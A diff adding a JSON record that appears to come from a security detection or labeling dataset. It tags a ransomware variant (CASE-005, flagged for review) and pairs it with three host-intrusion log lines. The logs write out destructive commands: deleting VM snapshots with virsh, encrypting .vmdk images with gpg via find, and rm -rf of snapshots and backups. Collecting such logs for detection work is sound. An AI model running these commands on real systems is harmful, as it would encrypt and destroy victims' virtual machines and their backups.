@@ -1,0 +1,41 @@
+{
+ "unit": 1094,
+ "gt": {
+  "gt_class": "family_variant",
+  "gt_case": "CASE-005",
+  "confidence": "medium",
+  "needs_review": true,
+  "reason": "勒索家族变体：阶段组合与 CASE-005 不完全一致"
+ },
+ "technique": "删除虚拟机快照后加密 vmdk 镜像文件并清除镜像备份",
+ "sources": [
+  "hids",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-07 17:17:03",
+   "source": "hids",
+   "log_id": "HID0487732",
+   "content": "virsh snapshot-delete web01 base --metadata virsh virsh snapshot-delete web01 base <== /bin/bash -c 'virsh' <=",
+   "event_id": "1094-HID0487732"
+  },
+  {
+   "timestamp": "2026-07-07 17:20:03",
+   "source": "hids",
+   "log_id": "HID0487748",
+   "content": "find /vmstore -name \"*.vmdk\" -exec gpg -c --batch --passphrase-file /tmp/.k {} \\; find find /vmstore -name <==",
+   "event_id": "1094-HID0487748"
+  },
+  {
+   "timestamp": "2026-07-07 17:25:03",
+   "source": "hids",
+   "log_id": "HID0487774",
+   "content": "rm -rf /vmstore/snapshots/* && unlink /vmstore/base.vmdk.bak <== /bin/bash -c 'rm' <== /usr/sbin/cron <== /usr",
+   "event_id": "1094-HID0487774"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
